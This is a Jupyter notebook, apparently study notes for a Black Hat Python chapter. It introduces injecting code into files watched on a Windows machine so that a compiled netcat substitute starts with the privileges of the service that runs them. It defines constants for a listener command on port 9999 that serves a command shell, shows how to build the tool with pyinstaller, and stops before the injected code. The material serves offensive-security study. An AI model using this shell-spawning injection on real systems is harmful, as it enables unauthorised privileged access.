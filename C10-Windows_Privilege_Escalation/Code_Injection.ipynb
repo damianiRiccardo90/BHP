{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyNHVzGV86ZQOd9aXaSJ3gft",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/damianiRiccardo90/BHP/blob/master/C10-Windows_Privilege_Escalation/Code_Injection.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# *__Code Injection__*\n",
        "\n",
        "Now that we can monitor processes and file locations, we'll automatically inject code into target files. We'll create very simple code snippets that spawn a compiled version of the __netcat.py__ tool with the privilege level of the originating service. There is a vast array of nasty things you can do with these VBScript, batch, and PowerShell files. We'll create the general framework, and you can run wild from there. Modify the __file_monitoring.py__ script and add the following code after the file modification constants:\n",
        "\n",
        "```\n",
        "NETCAT = 'c:\\\\users\\\\tim\\\\work\\\\netcat.exe'\n",
        "TGT_IP = '192.168.1.208'\n",
        "CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c '\n",
        "```\n",
        "\n",
        "The code we're about to inject will use these constants: __TGT_IP__ is the IP address of the victim (the Windows box we're injeting code into) and __TGT_PORT__ is the port we'll connect to. The __NETCAT__ variable gives the location of the Netcat substitute we coded in Chapter 2. If you haven't created an executable from that code, you can do so now:\n",
        "\n",
        "```\n",
        "C:\\Users\\tim\\netcat> pyinstaller -F netcat.py\n",
        "```\n",
        "\n",
        "Then drop the resulting __netcat.exe__ file into your directory and make sure the __NETCAT__ variable points to that executable.\n",
        "\n",
        "The command our injected code will execute creates a reverse command shell:"
      ],
      "metadata": {
        "id": "Cc6pfhvt8Rk7"
      }
    }
  ]
}